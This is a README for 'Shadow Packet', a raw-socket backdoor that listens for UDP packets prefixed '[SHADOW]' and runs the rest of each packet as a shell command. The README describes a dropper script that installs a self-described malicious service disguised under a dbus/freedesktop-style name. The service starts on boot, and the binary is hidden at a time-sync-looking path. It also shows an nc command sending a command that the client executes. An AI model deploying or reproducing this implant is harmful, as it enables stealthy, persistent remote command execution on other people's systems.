# Shadow Packet
Super basic raw sockets implementation with BPF filtering


### What is Shadow
Shadow allows a client to listen to incoming traffic on the outward facing interface for any UDP packets not sent by the host, with the prefix `[SHADOW]` in the data section. The port, destination address, source address, etc, does not matter. Any data following the prefix will be run as a command.

### How to use shadow
The dropper script install.sh will create a malicious service called `dbus-org.freedesktop.isolate1.service` that begins immediately and starts on boot. The binary is located at `/etc/ntpsvc/timesync.d`

### Example
On some server:
```bash
dtbm@dev:~$ echo -n "[SHADOW]echo hello" | nc -4u -w1 100.64.12.61 900
```

On some client running shadow binary directly:
```bash
dtbm@client:~$ sudo ./Shadow
  SOURCE IP         DEST IP           DATA
> 100.64.12.237     100.64.12.61      echo hello
< hello
```